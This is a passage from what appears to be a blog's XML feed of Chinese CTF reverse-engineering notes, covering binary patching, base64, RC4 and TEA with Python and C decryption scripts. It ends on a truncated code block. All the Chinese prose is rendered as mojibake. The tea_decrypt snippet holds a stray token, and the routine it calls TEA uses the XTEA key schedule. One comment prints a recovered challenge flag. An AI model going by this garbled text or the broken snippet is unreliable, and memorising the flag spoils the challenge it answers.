50 dup(?)          ; encode_Result: 50å­—èŠ‚<br>-0000000000000012 len             db ?                  ; len: 1å­—èŠ‚<br>-0000000000000011 i               db ?                  ; i: 1å­—èŠ‚<br>+0000000000000000  s              db 8 dup(?)           ; s: 8å­—èŠ‚<br>+0000000000000008  r              db 8 dup(?)           ; r: 8å­—èŠ‚<br></code></pre></td></tr></table></figure><p>A0-50&#x3D;50,æ‰€ä»¥ä¸Šå›¾é»„è‰²ä½ç½®ä¸º50</p><p>ç°åœ¨è¦æ”¹ä¸ºencï¼ŒA0-100&#x3D;-60ï¼Œå˜æˆA0,ç›¸å½“äºæŠŠåŠ å¯†åçš„æ•°æ®å¿«é€Ÿæ”¹æˆå¯†æ–‡ï¼Œä¹Ÿå¯ä»¥è°ƒè¯•çš„æ—¶å€™ä¸€ä½ä½æ”¹</p><img src="/2025/02/05/patch/1724144757695-5141af2c-9c55-43a9-a4d2-c56ffa3e62d4.png" class="" title="img"><p>è¾“å…¥é•¿åº¦ä¸º48ä½ï¼ˆé¢˜ç›®è¦æ±‚ï¼‰çš„æ—¶å€™æ­£å¸¸è¾“å‡ºflag</p><img src="/2025/02/05/patch/1724228737010-235a7104-10ec-47aa-9b54-9978af1259d8.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Reverseå¸¸è§ç®—æ³•</title>
    <link href="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/"/>
    <url>/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>1byte-&gt;2**n bytes</p><ul><li>éå¯¹ç§°åŠ å¯†ï¼šRSA ECC SM2 SM9</li><li>å“ˆå¸Œï¼šMD5 SHA SM3</li><li>base58ï¼ˆæ•´é™¤ï¼‰</li></ul><p>1byte-&gt;n bytes</p><ul><li>åˆ†ç»„ï¼šSM1 SM4 SM7</li><li>base16,32,64,85</li></ul><p>1byte-&gt;1 byte</p><ul><li>æ›¿æ¢å¯†ç </li><li>RC4 ZUC</li></ul><h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><p>æ ¸å¿ƒï¼šä¸‰è½¬å››</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689236059101-693a1652-dd19-464f-9730-cac9a18f55b2.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689236688306-efc39010-7dc0-4bf0-8a7d-49d3922156e8.png" class="" title="img"><p>è¡¥å……ä¸€ä¸‹æˆ‘å¯¹å€’æ•°ç¬¬å››è¡Œçš„çš„å›°æƒ‘åŠè§£é‡Šï¼šå­—æ¯å’Œ3è¿›è¡Œä¸æ“ä½œåªä¿ç•™å­—æ¯çš„äºŒè¿›åˆ¶æœ€åä¸¤ä½ï¼Œå·¦ç§»4ç›¸å½“äºç»™ä½å››ä½åŠ 0ï¼Œä¸€å…±æ˜¯å…­ä½ï¼›ååŠéƒ¨åˆ†ç›´æ¥å³ç§»4ï¼Œç›¸å½“äºåªå‰©4ä½ï¼Œä¸¤æ•°å–æˆ–è¿ç®—åé¢çš„æ•°è™½ç„¶åªæœ‰4ä½ï¼Œä½†å‰é¢å¯ä»¥è¡¥0ï¼Œä¸”ä¸€ä¸ªæ•°è·Ÿ0è¿›è¡Œæˆ–è¿ç®—å–å†³äºå®ƒè‡ªèº«ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯6ä½</p><p>æœ‰æ—¶å€™ä¼šæ˜¯ä¸‹é¢çš„å½¢å¼ï¼Œä¸»è¦ä¸€ä¸‹å­æ²¡çœ‹å‡ºæ¥ï¼Œè®°å½•ä¸€ä¸‹ã€‚å‘ç°&gt;&gt;2å’Œ&amp;0x3fè¿˜æ˜¯åœ¨çš„ï¼Œå¦å¤–ä¸€äº›ç”¨ä½æ“ä½œä»£æ›¿äº†ï¼Œä¸”å¯¹å­—ç¬¦ä¸²çš„é•¿åº¦æ ¹æ®%3çš„ä½™æ•°åšäº†åˆ†ç±»</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689664419744-c0e1d41e-b126-49b8-9a8a-48e0eb368f86.png" class="" title="img"><p>ä¹Ÿæœ‰è¿™ç§ä½è¿ç®—ä¹‹åå…¨æ˜¯&amp;0x3fçš„</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694240916741-6f8d2997-bcbf-40f6-af75-042c3b24aae3.png" class="" title="img"><p>%3å’Œ&#x3D;å‘Šè¯‰æˆ‘ä¸‹é¢çš„ä¹Ÿæ˜¯base64</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1722498705970-3564e836-8165-4298-b3fc-b8ee8d848a81.png" class="" title="img"><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>1.å…ˆåˆå§‹åŒ–çŠ¶æ€å‘é‡Sï¼ˆç”¨æ¥ä½œä¸ºå¯†é’¥æµç”Ÿæˆçš„ç§å­1ï¼‰</p><p>2.<strong>åˆå§‹å¯†é’¥keyï¼ˆç”±ç”¨æˆ·è¾“å…¥ï¼‰</strong>ï¼Œé•¿åº¦ä»»æ„,å¦‚æœè¾“å…¥é•¿åº¦å°äº256ä¸ªå­—èŠ‚ï¼Œåˆ™è¿›è¡Œå¾ªç¯ï¼Œç›´åˆ°å¡«æ»¡k,æœ‰æ—¶å€™kç”¨tæ¥è¡¨ç¤º</p><p>3.å¼€å§‹å¯¹çŠ¶æ€å‘é‡Sè¿›è¡Œç½®æ¢æ“ä½œï¼ˆç”¨æ¥æ‰“ä¹±åˆå§‹ç§å­1ï¼‰</p><p><strong>KSA</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689682750988-bfb173d7-d35f-4f0a-bc76-3a0be2c2b817.png" class="" title="img"><p>4.ç”Ÿæˆå¯†é’¥</p><p><strong>PGRA</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689686114595-4174755a-78fb-47f4-9f2a-49b2685a4280.png" class="" title="img"><p>rc4ä¹Ÿå¯ä»¥&amp;255(0xff)</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707662727122-9584da0c-e567-491b-ab9d-4e95ce14cdd0.png" class="" title="img"><p><strong>åœ¨rc4ä¸­ï¼Œkeyé€šå¸¸ä¸ºåˆå§‹åŒ–å‡½æ•°çš„ä¸­é—´å‚æ•°ï¼Œå¯ä»¥å¿«é€Ÿæ‰¾åˆ°</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB2</span>])<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x43</span>]*<span class="hljs-number">18</span>)<br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><p>%128çš„é­”æ”¹æœ¬è´¨ä¸Šå°±æ˜¯8ä½äºŒè¿›åˆ¶æ•°ç»„æˆçš„å¯†é’¥å˜ä¸º7ä½</p><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><h2 id="å¸¸è§„"><a href="#å¸¸è§„" class="headerlink" title="å¸¸è§„"></a>å¸¸è§„</h2><p>ä¸€ç§å¯¹ç§°ç®—æ³•ï¼Œå®ƒä½¿ç”¨64ä½æ˜æ–‡ï¼ˆä¸€ç»„å¯†æ–‡ï¼Œ2<em>32ä½ï¼‰å’Œ128ä½å¯†é’¥ï¼ˆä¸€èˆ¬æ˜¯4</em>32ä½ï¼‰è¿›è¡ŒåŠ è§£å¯†</p><p>TEAç³»åˆ—ç®—æ³•ä¸­å‡ä½¿ç”¨ä¸€ä¸ªDELTAå¸¸æ•°ï¼Œä½†DELTAçš„å€¼å¯¹ç®—æ³•å¹¶æ— ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯ä¸ºäº†é¿å…ä¸è‰¯çš„å–å€¼ï¼Œæ¨èDELTAçš„å€¼åå…­è¿›åˆ¶å€¼ä¸º<strong>0x9e3779B9</strong>ï¼Œç”¨äºä¿è¯æ¯ä¸€è½®åŠ å¯†éƒ½ä¸ç›¸åŒ</p><h3 id="æ ‡å‡†åŠ å¯†æµç¨‹"><a href="#æ ‡å‡†åŠ å¯†æµç¨‹" class="headerlink" title="æ ‡å‡†åŠ å¯†æµç¨‹"></a>æ ‡å‡†åŠ å¯†æµç¨‹</h3><ol><li>å°†æ˜æ–‡æŒ‰64ä½åˆ†ç»„ï¼Œå°†æ¯ä¸ªåˆ†ç»„è§†ä¸ºä¸€ä¸ª64ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œè®°ä¸ºV </li><li>å°†128ä½çš„å¯†é’¥åˆ†æˆ<strong>4ä¸ª32ä½çš„å­å¯†é’¥</strong>ï¼Œåˆ†åˆ«è®°ä¸ºK0ã€K1ã€K2ã€K3</li><li>å°†æ˜æ–‡åˆ†ç»„Våˆ†ä¸ºä¸¤ä¸ª32ä½çš„éƒ¨åˆ†ï¼Œåˆ†åˆ«è®°ä¸ºV0å’ŒV1</li><li>è®¾å®šä¸€ä¸ª32ä½çš„å¸¸æ•°delta</li><li>TEAç®—æ³•çš„åŠ å¯†è¿‡ç¨‹åŒ…æ‹¬32è½®è¿­ä»£ï¼Œæ¯ä¸€è½®çš„åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š</li></ol><p>  a. é¦–å…ˆï¼Œç´¯åŠ å™¨sumè¢«åˆå§‹åŒ–ä¸º0</p><p>  b. æ¥ç€ï¼Œå°†deltaå€¼åŠ åˆ°sumä¸­ã€‚deltaæ˜¯ä¸€ä¸ªå¸¸æ•°ï¼Œå…¶å€¼é€šå¸¸ä¸º0x9e3779b9ï¼Œç”¨äºå¢åŠ åŠ å¯†çš„éšæœºæ€§<br>  c. ç„¶åï¼Œå°†V1å·¦ç§»4ä½ï¼ŒåŠ ä¸ŠK0ï¼Œå†å¼‚æˆ–ä¸Š(V1+sum)å’Œ(V1å³ç§»5ä½+K1)çš„å€¼ã€‚å¾—åˆ°çš„ç»“æœä½œä¸ºV0çš„æ–°å€¼<br>  d. æ¥ä¸‹æ¥ï¼Œå°†V0å·¦ç§»4ä½ï¼ŒåŠ ä¸ŠK2ï¼Œå†å¼‚æˆ–ä¸Š(V0+sum)å’Œ(V0å³ç§»5ä½+K3)çš„å€¼ã€‚å¾—åˆ°çš„ç»“æœä½œä¸ºV1çš„æ–°å€¼<br>  e. é‡å¤ä¸Šè¿°æ­¥éª¤32æ¬¡ï¼Œå³å®Œæˆä¸€è½®è¿­ä»£ã€‚åœ¨æ¯ä¸€è½®è¿­ä»£ä¸­ï¼ŒV0å’ŒV1çš„å€¼éƒ½ä¼šè¢«æ›´æ–°ï¼Œå…¶ä¸­V1çš„æ›´æ–°ä¾èµ–V0ï¼Œè€ŒV0çš„æ›´æ–°ä¾èµ–äºV1</p><ol><li>ç»è¿‡32è½®è¿­ä»£åï¼Œå¾—åˆ°åŠ å¯†åçš„å¯†æ–‡ï¼Œè®°ä¸ºC0å’ŒC1 </li><li>å°†C0å’ŒC1æŒ‰é¡ºåºè¿æ¥èµ·æ¥ï¼Œå¾—åˆ°64ä½çš„å¯†æ–‡</li></ol><h3 id="ç®—æ³•æ³¨æ„ç‚¹"><a href="#ç®—æ³•æ³¨æ„ç‚¹" class="headerlink" title="ç®—æ³•æ³¨æ„ç‚¹"></a>ç®—æ³•æ³¨æ„ç‚¹</h3><p>keyä¸€èˆ¬ä¸ºåŠ å¯†å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ï¼Œ<strong>sum-&#x3D;0x61c88647å’Œsum+&#x3D;0x9e3779b9æ˜¯ç­‰ä»·çš„</strong></p><p>å¾ªç¯é‡Œçš„lå’Œrä¸€èˆ¬ç”¨v0å’Œv1ï¼Œè¿™æ ·ä¸å®¹æ˜“å¼„æ··</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">tea_encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* v, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* key)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        l += (((r &lt;&lt; <span class="hljs-number">4</span>) ^ (r &gt;&gt; <span class="hljs-number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        sum += DELTA;<br>        r += (((l &lt;&lt; <span class="hljs-number">4</span>) ^ (l &gt;&gt; <span class="hljs-number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]); <br>    &#125;<br>    v[<span class="hljs-number">0</span>] = l;<br>    v[<span class="hljs-number">1</span>] = r;<br>&#125;<br><br><span class="hljs-comment">//åˆ©ç”¨å¯é€†æ€§å°†åŠ å¯†è¿‡ç¨‹é€†è½¬</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">tea_decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* v, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* key)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>;<br>    sum = DELTA * <span class="hljs-number">32</span>; l<br>    <span class="hljs-title function_">for</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)</span> &#123;<br>        r -= (((l &lt;&lt; <span class="hljs-number">4</span>) ^ (l &gt;&gt; <span class="hljs-number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum -= DELTA;<br>        l -= (((r &lt;&lt; <span class="hljs-number">4</span>) ^ (r &gt;&gt; <span class="hljs-number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = l;<br>    v[<span class="hljs-number">1</span>] = r;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰äº›æ—¶å€™ä¼ªä»£ç *4ä½†å®é™…ä¸Šå¹¶ä¸éœ€è¦ï¼Œå› ä¸ºè¿™æ—¶çš„keyæ˜¯ä¸€ä¸ªå­—èŠ‚</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1724145418625-3419bc86-ade4-4d2d-8ab4-0c9287ff8738.png" class="" title="img"><p>æ³¨æ„v0å’Œv1åˆ°åº•æ˜¯intè¿˜æ˜¯unsigned int</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1730958458935-aeab96b1-8b7c-4fc9-9571-ded865d59c3a.png" class="" title="img"><p>æœ‰å¤šæ­¥æ“ä½œçš„æ—¶å€™ä¸€å®šè¦æ³¨æ„å†™forå¾ªç¯çš„æ—¶å€™ä¹Ÿè¦é€†å‘ï¼Œä¸‹é¢æ¯æ¬¡å¾ªç¯éƒ½è¦è¿›è¡Œå¼‚æˆ–ï¼Œè‡ªç„¶å¾—ä»åå¾€å‰é€†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *k)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> sum = delta * <span class="hljs-number">16</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>        sum -= delta;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> enc[<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-number">0xBC2B4DF9</span>, <span class="hljs-number">0x6213DD13</span>, <span class="hljs-number">0x89FFFCC9</span>, <span class="hljs-number">0x0FC94F7D</span>, <span class="hljs-number">0x526D1D63</span>, <span class="hljs-number">0xE341FD50</span>, <span class="hljs-number">0x97287633</span>, <span class="hljs-number">0x6BF93638</span>, <br>    <span class="hljs-number">0x83143990</span>, <span class="hljs-number">0x1F2CE22C</span><br>    &#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key[<span class="hljs-number">4</span>] = &#123;<br>    <span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x09101112</span>, <span class="hljs-number">0x13141516</span>, <span class="hljs-number">0x15161718</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">2</span>; i-=<span class="hljs-number">2</span>)<br>    &#123;<br>        enc[i] ^= enc[<span class="hljs-number">1</span>];<br>        enc[i - <span class="hljs-number">1</span>] ^= enc[<span class="hljs-number">0</span>];<br>        decrypt(enc, key);<br>    &#125;<br>    decrypt(enc, key);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, enc);<br>&#125;<br><span class="hljs-comment">// DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;</span><br></code></pre></td></tr></table></figure><p>teaç®—æ³•ä¼šæœ‰å¾ˆå¤šé­”æ”¹çš„åœ°æ–¹ï¼Œæ¯”å¦‚å¾ªç¯æ¬¡æ•°ï¼Œç®—æ³•ä¸­å¤šå¼‚æˆ–å‡ ä¸ªæ•°ï¼Œä¸‹é¢åœ¨teaçš„å‰åè¿˜å®ç°äº†äº¤æ¢</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1705325961046-680c058b-ba27-4aa7-97a0-7092a31fa9a1.png" class="" title="img"><p>å¦‚æœç®—æ³•é‡Œé¢å¼‚æˆ–içš„è¯é‡Œé¢çš„å¾ªç¯ä¹Ÿè¦é€†ç€å†™</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1731857724576-3ca1a863-8cf9-4ca5-bac0-53045be9b033.png" class="" title="img"><h3 id="è§£å¯†è„šæœ¬"><a href="#è§£å¯†è„šæœ¬" class="headerlink" title="è§£å¯†è„šæœ¬"></a>è§£å¯†è„šæœ¬</h3><p>ç”±äºæ¶‰åŠå†…å­˜æŒ‡é’ˆç­‰é—®é¢˜ï¼Œå¤§éƒ¨åˆ†ç”¨cå†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>]);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x11121314</span>, <span class="hljs-number">0x22232425</span>, <span class="hljs-number">0x33343536</span>, <span class="hljs-number">0x41424344</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0x38b97e28</span>, <span class="hljs-number">0xb7e510c1</span>, <span class="hljs-number">0xb4b29fae</span>, <span class="hljs-number">0x5593bbd7</span>,<span class="hljs-number">0x3c2e9b9e</span>, <span class="hljs-number">0x1671c637</span>, <span class="hljs-number">0x8f3a8cb5</span>, <span class="hljs-number">0x5116e515</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>) &#123;<br>        decrypt(&amp;v5[i], key);<br>    &#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>teaåŠ å¯†çš„å¦ä¸€ç§æ¨¡å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 